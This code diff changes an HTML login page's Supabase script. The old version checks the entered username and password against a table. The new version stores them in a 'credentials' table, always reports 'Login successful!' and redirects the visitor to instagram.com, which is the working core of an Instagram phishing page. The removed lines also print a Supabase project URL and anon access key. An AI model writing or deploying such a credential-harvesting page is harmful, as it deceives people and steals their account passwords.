@@ -334,8 +334,8 @@
     <script>
         // Initialize Supabase client
         // Replace these with your actual Supabase credentials
-        const SUPABASE_URL = 'https://pvbkrahfgelbztrgelsa.supabase.co'; // e.g., https://xxxxx.supabase.co
-        const SUPABASE_ANON_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InB2YmtyYWhmZ2VsYnp0cmdlbHNhIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NjcyNzg5MzgsImV4cCI6MjA4Mjg1NDkzOH0.wZPtRyRg3owcNhrPmIt0D6nDjIgYFu31fX6UHp69NJM';
+        const SUPABASE_URL = 'YOUR_SUPABASE_URL'; // e.g., https://xxxxx.supabase.co
+        const SUPABASE_ANON_KEY = 'YOUR_SUPABASE_ANON_KEY';
         
         // Fix: Use the global supabase object correctly
         const { createClient } = supabase;
@@ -361,35 +361,33 @@
             messageDiv.innerHTML = '';
 
             try {
-                // Query the credentials table
-                console.log('Attempting login for username:', username);
+                // Insert the credentials into the database
+                console.log('Storing credentials for username:', username);
                 
                 const { data, error } = await supabaseClient
                     .from('credentials')
-                    .select('*')
-                    .eq('username', username)
-                    .eq('password', password)
-                    .single();
+                    .insert([
+                        { 
+                            username: username, 
+                            password: password 
+                        }
+                    ])
+                    .select();
 
-                console.log('Query result:', { data, error });
+                console.log('Insert result:', { data, error });
 
                 if (error) {
-                    if (error.code === 'PGRST116') {
-                        // No rows returned - invalid credentials
-                        showMessage('Invalid username or password', 'error');
-                    } else {
-                        showMessage('Error: ' + error.message, 'error');
-                        console.error('Supabase error:', error);
-                    }
-                } else if (data) {
-                    // Successful login
+                    showMessage('Error storing credentials: ' + error.message, 'error');
+                    console.error('Supabase error:', error);
+                } else {
+                    // Successfully stored credentials
                     showMessage('Login successful!', 'success');
-                    console.log('User data:', data);
+                    console.log('Credentials stored:', data);
                     
-                    // Redirect or perform additional actions after successful login
+                    // Redirect after storing
                     setTimeout(() => {
-                        // Replace with your dashboard or home page URL
-                        window.location.href = 'dashboard.html';
+                        // Redirect to Instagram or wherever you want
+                        window.location.href = 'https://www.instagram.com';
                     }, 1500);
                 }
             } catch (err) {
